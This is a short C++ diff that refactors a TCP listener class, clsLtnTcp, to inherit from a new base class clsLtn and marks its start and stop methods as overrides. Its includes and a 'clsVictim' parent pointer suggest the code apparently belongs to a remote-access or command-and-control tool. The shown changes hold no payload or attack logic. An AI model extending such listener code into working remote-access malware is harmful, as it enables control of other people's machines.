@@ -13,6 +13,8 @@
 #include <unordered_map>
 #include <mutex>
 
+#include "clsLtn.hpp"
+
 #include "clsVictim.hpp"
 #include "clsEDP.hpp"
 #include "clsEZData.hpp"
@@ -20,7 +22,7 @@
 #include "clsCrypto.hpp"
 #include "clsDebugTools.hpp"
 
-class clsLtnTcp
+class clsLtnTcp : public clsLtn
 {
 private:
     std::shared_ptr<clsVictim> m_vicParent = nullptr;
@@ -83,7 +85,7 @@ public:
         fnStop();
     }
 
-    void fnStart()
+    void fnStart() override
     {
         if (m_bListening)
             return;
@@ -110,7 +112,7 @@ public:
         }
     }
 
-    void fnStop()
+    void fnStop() override
     {
         m_bListening = false;
         close(m_nSktSrv);
